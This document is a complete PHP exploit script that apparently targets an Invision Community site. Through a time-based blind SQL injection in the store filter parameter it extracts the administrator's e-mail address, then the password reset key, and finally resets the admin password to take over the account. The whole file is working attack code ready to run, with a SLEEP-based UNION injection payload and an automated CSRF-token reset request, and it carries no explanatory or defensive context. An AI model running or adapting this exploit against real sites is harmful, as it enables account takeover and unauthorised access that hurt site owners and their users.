<?php
set_time_limit(0);
error_reporting(E_ERROR);

if (!extension_loaded("curl")) die("[-] cURL extension required!\n");

if ($argc != 2) die("\nUsage: php $argv[0] <URL>\n\n");

$url = $argv[1];
$ch  = curl_init();
$sec = 3; 

curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_URL, "{$url}index.php?/store/");

$user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36';
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);

function sql_injection($sql)
{
	global $ch, $sec;
	
	$min = true;
	$idx = 1;
	
	while(1)
	{
		$test = 256;

		for ($i = 7; $i >= 0; $i--)
		{
			$test = $min ? ($test - pow(2, $i)) : ($test + pow(2, $i));
			$injection = "` ON 1 UNION SELECT IF(ORD(SUBSTR(({$sql}),{$idx},1))<{$test},1,SLEEP({$sec})) OR ?=?#";
			curl_setopt($ch, CURLOPT_POSTFIELDS, sprintf("cat=1&filter[%s]=1", rawurlencode($injection)));
			$start = time(); curl_exec($ch); $secs = time() - $start;
			$min = ($secs < $sec);
		}
		
		if (($chr = $min ? ($test - 1) : ($test)) == 0) break;
		$data .= chr($chr); $min = true; $idx++;
		print "\r[*] Data: {$data}";
	}
	
	return $data;
}

print "[+] Step 1: fetching admin's e-mail address\n";

$email = sql_injection("SELECT email FROM core_members WHERE member_id=1");

print "\n[+] Step 2: go to {$url}index.php?/lostpassword/ and request a password reset by using the above e-mail. When you're done press enter.";

fgets(STDIN);

print "[+] Step 3: fetching the password reset key\n";

$vid = sql_injection("SELECT vid FROM core_validating WHERE member_id=1 AND lost_pass=1 ORDER BY entry_date DESC LIMIT 1");

print "\n[+] Step 4: taking over the admin account by resetting their password\n";

@unlink('./cookies.txt');

curl_setopt($ch, CURLOPT_URL, "{$url}index.php?/lostpassword/");
curl_setopt($ch, CURLOPT_POST, false);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_COOKIEJAR, './cookies.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, './cookies.txt');

if (!preg_match('/csrfKey: "([^"]+)"/i', curl_exec($ch), $csrf)) die("[-] CSRF token not found!\n");

$passwd = md5(time());
$params = "do=validate&vid={$vid}&mid=1&password={$passwd}&password_confirm={$passwd}&resetpass_submitted=1&csrfKey={$csrf[1]}"; // use "key" if it errors

curl_setopt($ch, CURLOPT_POSTFIELDS, $params);

if (!preg_match("/301 Moved Permanently/i", curl_exec($ch))) die("[-] Attack failed!\n");

print "[+] Done! You can log into the AdminCP with {$email}:{$passwd}\n";
